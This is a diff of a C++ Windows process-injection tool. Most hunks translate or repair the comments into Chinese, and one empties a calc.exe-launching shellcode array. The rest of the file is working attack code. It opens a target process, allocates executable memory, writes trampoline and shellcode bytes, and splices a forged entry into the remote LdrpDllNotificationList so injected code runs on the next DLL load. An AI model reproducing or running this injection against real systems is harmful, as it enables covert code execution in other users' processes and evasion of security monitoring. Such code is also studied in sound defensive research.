@@ -3,7 +3,7 @@
 #include "nt.h"
 #include <cstdint>
 
-// �ص�����
+// 回调函数
 VOID DummyCallback(ULONG NotificationReason, const PLDR_DLL_NOTIFICATION_DATA NotificationData, PVOID Context)
 {
     return;
@@ -18,13 +18,13 @@ PLIST_ENTRY GetDllNotificationListHead() {
 
     if (hNtdll != NULL) {
 
-        // �ҵ�LdrRegisterDllNotification����
+        // 找到LdrRegisterDllNotification函数
         _LdrRegisterDllNotification pLdrRegisterDllNotification = (_LdrRegisterDllNotification)GetProcAddress(hNtdll, "LdrRegisterDllNotification");
 
-        // �ҵ� LdrUnregisterDllNotification����
+        // 找到 LdrUnregisterDllNotification函数
         _LdrUnregisterDllNotification pLdrUnregisterDllNotification = (_LdrUnregisterDllNotification)GetProcAddress(hNtdll, "LdrUnregisterDllNotification");
 
-        // ���ص�����ע��Ϊ DLL ֪ͨ�ص�
+        // 将回调函数注册为 DLL 通知回调
         PVOID cookie;
         NTSTATUS status = pLdrRegisterDllNotification(0, (PLDR_DLL_NOTIFICATION_FUNCTION)DummyCallback, NULL, &cookie);
         if (status == 0) {
@@ -34,7 +34,7 @@ PLIST_ENTRY GetDllNotificationListHead() {
             head = ((PLDR_DLL_NOTIFICATION_ENTRY)cookie)->List.Flink;
             printf("[+] Found LdrpDllNotificationList head: %p\n", head);
 
-            // ж�ػص�����
+            // 卸载回调函数
             status = pLdrUnregisterDllNotification(cookie);
             if (status == 0) {
                 printf("[+] Successfully unregistered dummy callback\n");
@@ -47,23 +47,23 @@ PLIST_ENTRY GetDllNotificationListHead() {
 
 LPVOID GetNtdllBase(HANDLE hProc) {
 
-    // �ҵ� NtQueryInformationProcess����
+    // 找到 NtQueryInformationProcess函数
     NtQueryInformationProcess pNtQueryInformationProcess = (NtQueryInformationProcess)GetProcAddress((HMODULE)GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
 
-    // ��ȡԶ�̽��̵�PEB
+    // 获取远程进程的PEB
     PROCESS_BASIC_INFORMATION info;
     NTSTATUS status = pNtQueryInformationProcess(hProc, ProcessBasicInformation, &info, sizeof(info), 0);
     ULONG_PTR ProcEnvBlk = (ULONG_PTR)info.PebBaseAddress;
 
-    // ��ȡԶ��Ldr�ĵ�ַָ��
+    // 读取远程Ldr的地址指针
     ULONG_PTR ldrAddress = 0;
     BOOL res = ReadProcessMemory(hProc, ((char*)ProcEnvBlk + offsetof(_PEB, pLdr)), &ldrAddress, sizeof(ULONG_PTR), nullptr);
 
-    // ��ȡԶ�� InLoadOrderModuleListͷ�ĵ�ַ
+    // 读取远程 InLoadOrderModuleList头的地址
     ULONG_PTR ModuleListAddress = 0;
     res = ReadProcessMemory(hProc, ((char*)ldrAddress + offsetof(PEB_LDR_DATA, InLoadOrderModuleList)), &ModuleListAddress, sizeof(ULONG_PTR), nullptr);
 
-    //��ȡԶ�� InLoadOrderModuleList�еĵ�һ��LDR_DATA_TABLE_ENTRY��Ŀ
+    //读取远程 InLoadOrderModuleList中的第一个LDR_DATA_TABLE_ENTRY条目
     LDR_DATA_TABLE_ENTRY ModuleEntry = { 0 };
     res = ReadProcessMemory(hProc, (LPCVOID)ModuleListAddress, &ModuleEntry, sizeof(LDR_DATA_TABLE_ENTRY), nullptr);
 
@@ -73,26 +73,26 @@ LPVOID GetNtdllBase(HANDLE hProc) {
 
     LPWSTR sModuleName = (LPWSTR)L"ntdll.dll";
 
-    // ͨ����ȡԶ�� InLoadOrderModuleList�еĵ�һ�� LDR_DATA_TABLE_ENTRY��Ŀ��ʼ��������
+    // 通过读取远程 InLoadOrderModuleList中的第一个 LDR_DATA_TABLE_ENTRY条目开始遍历查找
     for (ReadProcessMemory(hProc, (LPCVOID)ModuleListAddress, &ModuleEntry, sizeof(LDR_DATA_TABLE_ENTRY), nullptr);
-        // ���������һ����Ŀʱֹͣ
+        // 当捕获到最后一个条目时停止
         (ULONG_PTR)(ModuleList->Flink) != ModuleListAddress;
-        //��ȡlist����һ����Ŀ
+        //读取list中下一个条目
         ReadProcessMemory(hProc, (LPCVOID)nextModuleAddress, &ModuleEntry, sizeof(LDR_DATA_TABLE_ENTRY), nullptr))
     {
 
-        //�� dll name�Ļ���������
+        //将 dll name的缓冲区清零
         memset(name, 0, sizeof(name));
 
-        // ��Զ��BaseDllName��UNICODE_STRING���Ļ��������뻺������name��
+        // 将远程BaseDllName（UNICODE_STRING）的缓冲区读入缓冲区“name”
         ReadProcessMemory(hProc, (LPCVOID)ModuleEntry.BaseDllName.pBuffer, &name, ModuleEntry.BaseDllName.Length, nullptr);
 
-        // ��鵱ǰģ��������Ƿ�Ϊntdll.dll������ǣ��򷵻�DllBase��ַ
+        // 检查当前模块的名称是否为ntdll.dll，如果是，则返回DllBase地址
         if (wcscmp(name, sModuleName) == 0) {
             return (LPVOID)ModuleEntry.DllBase;
         }
 
-        // �������� nextModuleAddress Ϊָ��list�е���һ��entry��Ŀ
+        // 否则，设置 nextModuleAddress 为指向list中的下一个entry条目
         ModuleList = (LIST_ENTRY*)&ModuleEntry;
         nextModuleAddress = (ULONG_PTR)(ModuleList->Flink);
     }
@@ -103,24 +103,24 @@ void PrintDllNotificationList(HANDLE hProc, LPVOID remoteHeadAddress) {
     printf("\n");
     printf("[+] Remote DLL Notification Block List:\n");
 
-    // ΪLDR_DLL_NOTIFICATION_ENTRY�����ڴ�
+    // 为LDR_DLL_NOTIFICATION_ENTRY分配内存
     BYTE* entry = (BYTE*)malloc(sizeof(LDR_DLL_NOTIFICATION_ENTRY));
 
-    // ��Զ�̽����ж�ȡ��ͷ����Ŀ
+    // 从远程进程中读取其头部条目
     ReadProcessMemory(hProc, remoteHeadAddress, entry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);
     LPVOID currentEntryAddress = remoteHeadAddress;
     do {
 
-        // ��ӡ LDR_DLL_NOTIFICATION_ENTRY ����ص������ĵ�ַ
+        // 打印 LDR_DLL_NOTIFICATION_ENTRY 及其回调函数的地址
         printf("    0x%p -> 0x%p\n", currentEntryAddress, ((PLDR_DLL_NOTIFICATION_ENTRY)entry)->Callback);
 
-        // ��ȡlist����һ���ص��ĵ�ַ
+        // 获取list中下一个回调的地址
         currentEntryAddress = ((PLDR_DLL_NOTIFICATION_ENTRY)entry)->List.Flink;
 
-        // ��ȡlist�е���һ���ص�
+        // 读取list中的下一个回调
         ReadProcessMemory(hProc, currentEntryAddress, entry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);
 
-    } while ((PLIST_ENTRY)currentEntryAddress != remoteHeadAddress); // ���ٴε����б���ͷ��ʱֹͣ
+    } while ((PLIST_ENTRY)currentEntryAddress != remoteHeadAddress); // 当再次到达列表的头部时停止
 
     free(entry);
 
@@ -144,18 +144,17 @@ DWORD_PTR FindPattern(DWORD_PTR dwAddress, DWORD dwLen, PBYTE bMask, PCHAR szMas
     return 0;
 }
 
-// Pop Calc.exe Shellcode from Sektor7
-unsigned char shellcode[276] = { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x0, 0x0, 0x0, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0xf, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x2, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x1, 0xd0, 0x8b, 0x80, 0x88, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x1, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x1, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x1, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x3, 0x4c, 0x24, 0x8, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x1, 0xd0, 0x66, 0x41, 0x8b, 0xc, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x1, 0xd0, 0x41, 0x8b, 0x4, 0x88, 0x48, 0x1, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x8d, 0x1, 0x1, 0x0, 0x0, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0xa, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x6, 0x7c, 0xa, 0x80, 0xfb, 0xe0, 0x75, 0x5, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x0, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x0 };
+unsigned char shellcode[276] = { };
 
 unsigned char restore[] = {
-    0x41, 0x56,                                          // push r14
+    0x41, 0x56,                                                      // push r14
     0x49, 0xBE, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11,      // move r14, 0x1122334455667788
-    0x41, 0xC7, 0x06, 0x44, 0x33, 0x22, 0x11,                  // mov dword [r14], 0x11223344
-    0x41, 0xC7, 0x46, 0x04, 0x44, 0x33, 0x22, 0x11,            // mov dword [r14+4], 0x11223344
+    0x41, 0xC7, 0x06, 0x44, 0x33, 0x22, 0x11,                        // mov dword [r14], 0x11223344
+    0x41, 0xC7, 0x46, 0x04, 0x44, 0x33, 0x22, 0x11,                  // mov dword [r14+4], 0x11223344
     0x49, 0xBE, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11,      // move r14, 0x1122334455667788
-    0x41, 0xC7, 0x06, 0x44, 0x33, 0x22, 0x11,                  // mov dword [r14], 0x11223344
-    0x41, 0xC7, 0x46, 0x04, 0x44, 0x33, 0x22, 0x11,            // mov dword [r14+4], 0x11223344
-    0x41, 0x5e,                                          // pop r14
+    0x41, 0xC7, 0x06, 0x44, 0x33, 0x22, 0x11,                        // mov dword [r14], 0x11223344
+    0x41, 0xC7, 0x46, 0x04, 0x44, 0x33, 0x22, 0x11,                  // mov dword [r14+4], 0x11223344
+    0x41, 0x5e,                                                      // pop r14
 };
 
 // Trampoline shellcode for creating TpAllocWork for our restore prologue and malicious shellcode
@@ -164,119 +163,115 @@ unsigned char trampoline[] = { 0x56, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xe4, 0xf0, 0
 
 int main()
 {
-    // Get local LdrpDllNotificationList head address
+    // 获取本地LdrpDllNotificationList头地址
     LPVOID localHeadAddress = (LPVOID)GetDllNotificationListHead();
     printf("[+] Local LdrpDllNotificationList head address: 0x%p\n", localHeadAddress);
 
-    // Get local NTDLL base address
+    // 获取本地NTDLL基准地址
     HANDLE hNtdll = GetModuleHandleA("NTDLL.dll");
     printf("[+] Local NTDLL base address: 0x%p\n", hNtdll);
 
-    // Calculate the offset of LdrpDllNotificationList from NTDLL base
+    // 计算 LdrpDllNotificationList 相对于 NTDLL 基址的偏移量
     int offsetFromBase = (BYTE*)localHeadAddress - (BYTE*)hNtdll;
     printf("[+] LdrpDllNotificationList offset from NTDLL base: 0x%X\n", offsetFromBase);
 
-    // Open handle to remote process
     HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 4844);
     printf("[+] Got handle to remote process\n");
 
-    // Get remote NTDLL base address
+    // 获取远程NTDLL基地址
     LPVOID remoteNtdllBase = GetNtdllBase(hProc);
     LPVOID remoteHeadAddress = (BYTE*)remoteNtdllBase + offsetFromBase;
     printf("[+] Remote LdrpDllNotificationList head address 0x%p\n", remoteHeadAddress);
 
-    // Print the remote Dll Notification List
+    // 打印远程 Dll 通知列表
     PrintDllNotificationList(hProc, remoteHeadAddress);
 
-    // Allocate memory for our trampoline + restore prologue + shellcode in the remote process
+    // 在目标进程中为trampoline + restore prologue + shellcode分配内存
     LPVOID trampolineEx = VirtualAllocEx(hProc, 0, sizeof(restore) + sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     printf("[+] Allocated memory for restore trampoline + prologue + shellcode in remote process\n");
     printf("[+] Trampoline address in remote process: 0x%p\n", trampolineEx);
 
-    // Offset the size of the trampoline to get the restore prologue address
+    // 偏移trampoline块的大小来获得恢复序言地址
     LPVOID restoreEx = (BYTE*)trampolineEx + sizeof(trampoline);
     printf("[+] Restore prologue address in remote process: 0x%p\n", restoreEx);
 
-    // Offset the size of the trampoline and restore prologue to get the shellcode address
+    // 偏移trampoline + restore prologue块的大小来获取shellcode地址
     LPVOID shellcodeEx = (BYTE*)trampolineEx + sizeof(trampoline) + sizeof(restore);
     printf("[+] Shellcode address in remote process: 0x%p\n", shellcodeEx);
 
-    // Find our restoreEx place holder in the trampoline shellcode
+    // 在trampoline shellcode中找到restorex占位符
     LPVOID restoreExInTrampoline = (LPVOID)FindPattern((DWORD_PTR)&trampoline, sizeof(trampoline), (PBYTE)"\x11\x11\x11\x11\x11\x11\x11\x11", (PCHAR)"xxxxxxxx");
 
-    // Overwrite our restoreEx place holder with the address of our restore prologue
+    // 用restore prologue的地址覆写restoreEx占位符
     memcpy(restoreExInTrampoline, &restoreEx, 8);
 
-    // Write the trampoline shellcode to the remote process
+    // 将trampoline shellcode写入目标进程
     WriteProcessMemory(hProc, trampolineEx, trampoline, sizeof(trampoline), nullptr);
     printf("[+] trampoline has been written to remote process: 0x%p\n", trampolineEx);
 
-    // Write the shellcode to the remote process
+    // 将shellcode写入远程目标进程中
     WriteProcessMemory(hProc, shellcodeEx, shellcode, sizeof(shellcode), nullptr);
     printf("[+] Shellcode has been written to remote process: 0x%p\n", shellcodeEx);
 
-    // Create a new LDR_DLL_NOTIFICATION_ENTRY
+    // 创建一个新的LDR_DLL_NOTIFICATION_ENTRY条目
     LDR_DLL_NOTIFICATION_ENTRY newEntry = {};
     newEntry.Context = NULL;
 
-    // Set the Callback attribute to point to our trampoline
+    // 设置 Callback 属性指向 trampoline shellcode
     newEntry.Callback = (PLDR_DLL_NOTIFICATION_FUNCTION)trampolineEx;
 
-    // We want our new entry to be the first in the list 
-    // so its List.Blink attribute should point to the head of the list
+    // 希望新条目成为列表中的第一个，所以新条目的List.Blink属性应该指向列表的头部
     newEntry.List.Blink = (PLIST_ENTRY)remoteHeadAddress;
 
-    // Allocate memory buffer for LDR_DLL_NOTIFICATION_ENTRY
+    // 为LDR_DLL_NOTIFICATION_ENTRY分配内存缓冲区
     BYTE* remoteHeadEntry = (BYTE*)malloc(sizeof(LDR_DLL_NOTIFICATION_ENTRY));
 
-    // Read the head entry from the remote process
+    // 从目标进程中读取头条目
     ReadProcessMemory(hProc, remoteHeadAddress, remoteHeadEntry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);
 
-    // Set the new entry's List.Flink attribute to point to the original first entry in the list
+    // 设置新条目的 List.Flink 属性为指向list中原来第一个条目
     newEntry.List.Flink = ((PLDR_DLL_NOTIFICATION_ENTRY)remoteHeadEntry)->List.Flink;
 
-    // Allocate memory for our new entry
+    // 为新条目分配内存空间
     LPVOID newEntryAddress = VirtualAllocEx(hProc, 0, sizeof(LDR_DLL_NOTIFICATION_ENTRY), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     printf("[+] Allocated memory for new entry in remote process: 0x%p\n", newEntryAddress);
 
-    // Write our new entry to the remote process
+    // 将新条目写入远程目标进程中
     WriteProcessMemory(hProc, (BYTE*)newEntryAddress, &newEntry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);
     printf("[+] New entry has been written to remote process: 0x%p\n", newEntryAddress);
 
-    // Calculate the addresses we need to overwrite with our new entry's address
-    // The previous entry's Flink (head) and the next entry's Blink (original 1st entry)
+    // 用新条目的地址计算我们需要覆写的地址
+    // 上一个条目的 Flink（头）和下一个条目的 Blink（原第一个条目）
     LPVOID previousEntryFlink = (LPVOID)((BYTE*)remoteHeadAddress + offsetof(LDR_DLL_NOTIFICATION_ENTRY, List) + offsetof(LIST_ENTRY, Flink));
     LPVOID nextEntryBlink = (LPVOID)((BYTE*)((PLDR_DLL_NOTIFICATION_ENTRY)remoteHeadEntry)->List.Flink + offsetof(LDR_DLL_NOTIFICATION_ENTRY, List) + offsetof(LIST_ENTRY, Blink));
 
-    // buffer for the original values we are goind to overwrite
+    // 定义一个需要覆写的原始值的缓冲区
     unsigned char originalValue[8] = {};
 
-    // Read the original value of the previous entry's Flink (head)
+    // 读取上一个条目的Flink（头）的原始值
     ReadProcessMemory(hProc, previousEntryFlink, &originalValue, 8, nullptr);
     memcpy(&restore[4], &previousEntryFlink, 8); // Set address to restore for previous entry's Flink (head)
     memcpy(&restore[15], &originalValue[0], 4); // Set the value to restore (1st half of value)
     memcpy(&restore[23], &originalValue[4], 4); // Set the value to restore (2nd half of value)
 
-    // Read the original value the next entry's Blink (original 1st entry)
+    // 读取下一个条目的Blink的原始值（原第一个条目）
     ReadProcessMemory(hProc, nextEntryBlink, &originalValue, 8, nullptr);
     memcpy(&restore[29], &nextEntryBlink, 8); // Set address to restore for next entry's Blink (original 1st entry)
     memcpy(&restore[40], &originalValue[0], 4); // Set the value to restore (1st half of value)
     memcpy(&restore[48], &originalValue[4], 4); // Set the value to restore (2nd half of value)
 
-    // Write the restore prologue to the remote process
+    // 将恢复序（restore prologue）写入远程目标进程
     WriteProcessMemory(hProc, restoreEx, restore, sizeof(restore), nullptr);
     printf("[+] Restore prologue has been written to remote process: 0x%p\n", restoreEx);
 
-    // Overwrite the previous entry's Flink (head) with our new entry's address
+    // 用我们新条目的地址覆写上一个条目的 Flink（头）
     WriteProcessMemory(hProc, previousEntryFlink, &newEntryAddress, 8, nullptr);
 
-    // Overwrite the next entry's Blink (original 1st entry) with our new entry's address
+    // 用新条目的地址覆写下一个条目的 Blink（原第一个条目）
     WriteProcessMemory(hProc, nextEntryBlink, &newEntryAddress, 8, nullptr);
 
     printf("[+] LdrpDllNotificationList has been modified.\n");
     printf("[+] Our new entry has been inserted.\n");
 
-    // Print the remote Dll Notification List
     PrintDllNotificationList(hProc, remoteHeadAddress);
-
 }
